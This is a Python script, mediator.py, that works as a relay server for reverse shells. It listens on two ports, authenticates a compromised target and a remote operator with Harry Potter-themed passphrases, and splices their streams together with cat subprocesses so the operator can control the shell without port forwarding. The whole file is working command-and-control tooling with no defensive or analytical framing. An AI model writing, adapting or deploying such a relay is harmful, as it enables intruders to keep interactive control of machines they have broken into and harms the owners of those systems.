#!/usr/bin/python3
"""
Program: mediator.py
Author: C.J. May
Description: Bridge two connections to remotely connect an operator to a reverse shell without port forwarding
"""

import select
from socket import *
import subprocess
import threading


class Mediator:
    def __init__(self):
        # create reverse shell socket and bind it to a port
        self.targetServer = socket(AF_INET, SOCK_STREAM)
        self.targetServer.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        self.targetServer.bind(("",20001))
        # create operator socket and bind it to a port
        self.operatorServer = socket(AF_INET, SOCK_STREAM)
        self.operatorServer.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        self.operatorServer.bind(("",20000))
        # tell sockets to listen on respective ports for a max of 1 connection
        self.targetServer.listen(4)
        self.operatorServer.listen(4)
        self.activeCount = 0

    def handleConnections(self):
        while True:
            # wait for reverse shell to connect 
            targetConnection, targetAddress = self.targetServer.accept()
            targetKey = None
            # validate connection is from our reverse shell
            ready = select.select([self.targetServer], [], [], 5)
            if ready[0]:
                targetKey = targetConnection.recv(1024)
            if targetKey:
                if targetKey.decode() != "Stepping onto platform nine and three quarters...":
                    continue
            print("Reverse shell {} connected...".format(self.activeCount))

            # reverse shell connected... accept connection from operator
            operatorConnection, operatorAddress = self.operatorServer.accept()
            operatorKey = None
            ready = select.select([self.operatorServer], [], [], 5)
            if ready[0]:
                operatorKey = operatorConnection.recv(1024)
            if operatorKey:
                if operatorKey.decode() != "I solemnly swear that I am up to no good.":
                    continue
            print("Operator {} connected...".format(self.activeCount))

            # connect the streams with GNU black magic
            fromTarget = targetConnection.makefile("rb")
            toTarget = targetConnection.makefile("wb")
            fromOperator = operatorConnection.makefile("rb")
            toOperator = operatorConnection.makefile("wb")
            targetToOperator = subprocess.Popen("cat",
                                                stdin=fromTarget,
                                                stdout=toOperator,
                                                stderr=toOperator)
            operatorToTarget = subprocess.Popen("cat",
                                                stdin=fromOperator,
                                                stdout=toTarget,
                                                stderr=toTarget)
            print("GNU black magic applied...")

            terminatorThread = threading.Thread(target=self.waitAndTerminate,
                                                args=[targetToOperator,
                                                      targetConnection,
                                                      operatorConnection,
                                                      self.activeCount])
            terminatorThread.daemon = True
            terminatorThread.start()
            self.activeCount = (self.activeCount + 1) % 4

    def waitAndTerminate(self, targetToOperator, targetSock, operatorSock, pid):
        # close connections when done
        targetToOperator.wait()
        targetSock.close()
        operatorSock.close()

        # connections terminated
        print("Mischief managed. ({})".format(pid))


if __name__ == "__main__":
    server = Mediator()
    server.handleConnections()
